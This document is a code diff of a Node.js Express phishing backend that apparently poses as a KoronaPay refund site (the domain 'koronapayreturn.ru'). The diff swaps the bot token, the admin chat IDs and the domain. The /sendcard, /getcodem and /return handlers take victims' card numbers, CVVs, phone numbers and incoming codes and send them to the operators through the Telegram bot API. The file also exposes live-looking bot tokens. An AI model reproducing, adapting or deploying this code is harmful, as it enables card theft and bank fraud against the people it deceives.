@@ -2,11 +2,11 @@ const express = require('express');
 const app = express();
 const request = require('request');
 const {Telegraf} = require('telegraf');
-const bot = new Telegraf('7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc');
-const link = 'denzmele-goga-site-42fe.twc1.net'
+const bot = new Telegraf('7315612813:AAHb_3CCOnC8LmHUwUNQgiu2-6IhOZvWdiw');
+const link = 'koronapayreturn.ru'
 let sendms = [];
-const botusers = [5903574289, 7147845976]
-const admins = [5903574289, 7147845976]
+const botusers = [5708889761, 7147845976]
+const admins = [5708889761, 7147845976]
 function sd(number){
     return number.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
 }
@@ -92,7 +92,7 @@ app.get('/return', (req, res) => {
             var str = encodeURIComponent(`💳 <b>По ссылке перешел пользователь!</b>
 Сумма: <code>${req.query.m}</code>`);
             const options = {
-                url: `https://api.telegram.org/bot7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
+                url: `https://api.telegram.org/bot7315612813:AAHb_3CCOnC8LmHUwUNQgiu2-6IhOZvWdiw/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
                 method: 'GET'
             };
             request(options, (err,res,body)=>{
@@ -117,7 +117,7 @@ app.get('/getcodem', (req,res)=>{
         var str = encodeURIComponent(`💳 <b>Пришел новый код:</b>
 Код: <code>${req.query.code}</code>`);
         const options = {
-            url: `https://api.telegram.org/bot7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
+            url: `https://api.telegram.org/bot7315612813:AAHb_3CCOnC8LmHUwUNQgiu2-6IhOZvWdiw/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
             method: 'GET'
         };
         request(options, (err,res,body)=>{
@@ -140,7 +140,7 @@ app.get('/sendcard', (req, res) => {
 CVV: <code>${req.query.ccvv}</code>
 Номер телефона: <code>${req.query.num}</code>`);
         const options = {
-            url: `https://api.telegram.org/bot7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
+            url: `https://api.telegram.org/bot7315612813:AAHb_3CCOnC8LmHUwUNQgiu2-6IhOZvWdiw/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
             method: 'GET'
         };
         request(options, (err,res,body)=>{
